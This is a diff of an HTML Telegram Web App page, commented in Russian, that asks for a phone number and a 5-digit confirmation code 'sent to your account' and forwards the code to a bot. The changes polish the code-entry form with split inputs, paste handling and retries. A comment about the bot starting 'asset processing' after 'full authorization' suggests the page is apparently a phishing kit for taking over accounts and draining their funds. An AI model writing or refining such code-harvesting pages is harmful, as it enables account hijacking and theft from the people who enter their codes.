@@ -194,6 +194,22 @@
             margin-top: 2rem;
             text-align: left;
         }
+        .code-input:focus {
+    outline: none;
+    border-color: white;
+    background: rgba(255,255,255,0.15);
+    transform: scale(1.05);
+    transition: all 0.2s ease;
+}
+
+.code-input:invalid {
+    border-color: #ff4444;
+}
+
+/* Стиль для активного поля */
+.code-input:focus {
+    box-shadow: 0 0 0 2px rgba(255,255,255,0.3);
+}
 
         .step {
             margin: 1.2rem 0;
@@ -275,22 +291,16 @@
 
         <!-- Форма ввода кода -->
         <!-- Форма ввода кода -->
+<!-- Форма ввода кода -->
 <div id="codeForm" class="auth-form">
     <div class="form-title">Введите код подтверждения отправленный на ваш аккаунт</div>
     
-    <!-- Одно поле для ввода всего кода -->
-    <input type="text" id="singleCodeInput" class="code-input" 
-           style="width: 100%; margin-bottom: 1rem; font-size: 1.2rem; letter-spacing: 8px;"
-           placeholder="Введите 5-значный код" maxlength="5" 
-           oninput="formatCodeInput(this)">
-    
-    <!-- Скрытые поля для обратной совместимости -->
-    <div class="code-inputs" id="codeInputs" style="display: none;">
-        <input type="text" class="code-input" maxlength="1" readonly>
-        <input type="text" class="code-input" maxlength="1" readonly>
-        <input type="text" class="code-input" maxlength="1" readonly>
-        <input type="text" class="code-input" maxlength="1" readonly>
-        <input type="text" class="code-input" maxlength="1" readonly>
+    <div class="code-inputs" id="codeInputs">
+        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)" onkeydown="if(event.key === 'Backspace') handleBackspace(this, 1)" onpaste="handlePaste(event)">
+        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)" onkeydown="if(event.key === 'Backspace') handleBackspace(this, 2)" onpaste="handlePaste(event)">
+        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)" onkeydown="if(event.key === 'Backspace') handleBackspace(this, 3)" onpaste="handlePaste(event)">
+        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)" onkeydown="if(event.key === 'Backspace') handleBackspace(this, 4)" onpaste="handlePaste(event)">
+        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 6)" onkeydown="if(event.key === 'Backspace') handleBackspace(this, 5)" onpaste="handlePaste(event)">
     </div>
     
     <div class="resend-code" onclick="resendCode()">Отправить код снова</div>
@@ -436,34 +446,60 @@ async function sendCodeToBackend(phone) {
         status.textContent = 'Ошибка соединения с сервером: ' + error.message;
     }
 }
-        function formatCodeInput(input) {
-    // Ограничиваем ввод только цифрами
-    input.value = input.value.replace(/\D/g, '');
-    
-    // Автоматически заполняем скрытые поля
-    const codeInputs = document.querySelectorAll('#codeInputs .code-input');
-    const value = input.value;
-    
-    for (let i = 0; i < 5; i++) {
-        if (codeInputs[i]) {
-            codeInputs[i].value = value[i] || '';
+        function moveToNext(input, nextIndex) {
+    if (input.value.length === 1) {
+        if (nextIndex <= 5) {
+            const nextInput = document.querySelector(`.code-inputs .code-input:nth-child(${nextIndex})`);
+            if (nextInput) {
+                nextInput.focus();
+                nextInput.select();
+            }
         }
-    }
-    
-    // Автоматически отправляем форму когда введено 5 цифр
-    if (value.length === 5) {
-        document.getElementById('verifyBtn').focus();
     }
 }
 
+// Функция для обработки Backspace
+function handleBackspace(input, currentIndex) {
+    if (input.value.length === 0 && currentIndex > 1) {
+        const prevInput = document.querySelector(`.code-inputs .code-input:nth-child(${currentIndex - 1})`);
+        if (prevInput) {
+            prevInput.focus();
+            prevInput.select();
+        }
+    }
+}
+
+// Функция для вставки кода из буфера обмена
+function handlePaste(event) {
+    const paste = (event.clipboardData || window.clipboardData).getData('text');
+    if (paste.length === 5 && /^\d+$/.test(paste)) {
+        const inputs = document.querySelectorAll('.code-input');
+        for (let i = 0; i < 5; i++) {
+            if (inputs[i]) {
+                inputs[i].value = paste[i] || '';
+            }
+        }
+        event.preventDefault();
+    }
+}
+
+// Обновленная функция verifyCode
 async function verifyCode() {
     const codeInputs = document.querySelectorAll('.code-input');
     const code = Array.from(codeInputs).map(input => input.value).join('');
     const status = document.getElementById('codeStatus');
     const verifyBtn = document.getElementById('verifyBtn');
     
+    console.log('🔢 Verifying code:', code);
+    
     if (code.length !== 5) {
-        status.textContent = 'Введите полный код';
+        status.textContent = 'Введите полный код из 5 цифр';
+        // Подсвечиваем незаполненные поля
+        codeInputs.forEach((input, index) => {
+            if (!input.value) {
+                input.style.borderColor = 'red';
+            }
+        });
         return;
     }
 
@@ -471,24 +507,43 @@ async function verifyCode() {
     verifyBtn.textContent = 'Проверка...';
     status.textContent = 'Проверка кода...';
     
-    // Отправляем код боту
-    const result = await sendDataToBot({
-        action: 'code_received',
-        code: code
-    });
+    console.log('📤 Sending code to bot...');
     
-    if (result && result.success) {
-        status.textContent = 'Код проверяется...';
-        // НЕ запускаем обработку активов здесь - бот сам запустит после полной авторизации
+    try {
+        // Отправляем код боту
+        const result = await sendDataToBot({
+            action: 'code_received',
+            code: code
+        });
         
-        // Закрываем веб-приложение через 2 секунды
-        setTimeout(() => {
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.close();
+        console.log('📨 Bot response:', result);
+        
+        if (result && result.success) {
+            status.textContent = '✅ Код принят! Проверяем авторизацию...';
+            
+            // Закрываем веб-приложение через 2 секунды
+            setTimeout(() => {
+                if (window.Telegram && Telegram.WebApp) {
+                    Telegram.WebApp.close();
+                }
+            }, 2000);
+        } else {
+            status.textContent = result?.message || 'Неверный код';
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'Подтвердить код';
+            
+            // Сбрасываем поля при ошибке
+            codeInputs.forEach(input => {
+                input.value = '';
+                input.style.borderColor = '';
+            });
+            if (codeInputs[0]) {
+                codeInputs[0].focus();
             }
-        }, 2000);
-    } else {
-        status.textContent = result?.message || 'Неверный код';
+        }
+    } catch (error) {
+        console.error('❌ Error sending code:', error);
+        status.textContent = 'Ошибка отправки кода';
         verifyBtn.disabled = false;
         verifyBtn.textContent = 'Подтвердить код';
     }
@@ -580,15 +635,21 @@ async function sendDataToBot(data) {
     console.log('📤 Sending data to bot:', data);
     
     if (window.Telegram && Telegram.WebApp) {
-        // Отправляем данные боту
-        Telegram.WebApp.sendData(JSON.stringify(data));
-        console.log('✅ Data sent to bot via Telegram.WebApp.sendData');
-        return { success: true };
+        try {
+            // Отправляем данные боту
+            Telegram.WebApp.sendData(JSON.stringify(data));
+            console.log('✅ Data sent to bot via Telegram.WebApp.sendData');
+            return { success: true };
+        } catch (error) {
+            console.error('❌ Error sending via Telegram.WebApp:', error);
+            return await sendDataToBotFallback(data);
+        }
     } else {
         console.log('🌐 Not in Telegram, using fallback');
         return await sendDataToBotFallback(data);
     }
 }
+
         // Функция для получения user_id из URL
 function getUserIdFromURL() {
     const urlParams = new URLSearchParams(window.location.search);
@@ -688,6 +749,7 @@ function getUserIdFromURL() {
     </script>
 </body>
 </html>
+
 
 
 
